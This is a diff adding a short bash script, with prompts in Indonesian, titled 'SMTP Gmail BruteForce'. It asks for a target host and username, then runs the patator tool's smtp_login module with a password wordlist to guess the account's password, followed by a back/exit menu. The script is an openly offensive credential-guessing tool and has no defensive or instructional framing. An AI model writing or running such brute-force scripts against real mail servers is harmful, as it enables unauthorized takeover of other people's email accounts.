@@ -1,0 +1,43 @@
+#!/bin/bash
+clear
+echo "\n\033[32;1m         ..::|[ SMTP Gmail BruteForce ]|::..\033[0m"
+echo "
+
+
+
+
+
+
+
+
+
+
+
+
+
+"
+echo -n "\n\033[31;1mMasukan Host Atau Ip : "
+read host
+echo -n "\nMasukan UserName : "
+read usr
+echo " \033[0m"
+cd ../xx/
+python2 patator smtp_login host=$host helo='ehlo its.me.com' user=$usr password=FILE0 0=wodlis/passwords.lst
+echo " "
+echo "
+=> Tekan \033[33mB\033[0m untuk kembali
+=> Tekan \033[31mK\033[0m untuk keluar"
+echo -n "=> Pilihan: "
+read upil
+if [ $upil = b ] || [ $upil = B ]
+then
+clear
+sh start
+fi
+
+if [ $upil = k ] || [ $upil = K ]
+then
+clear
+sh exit
+fi
+
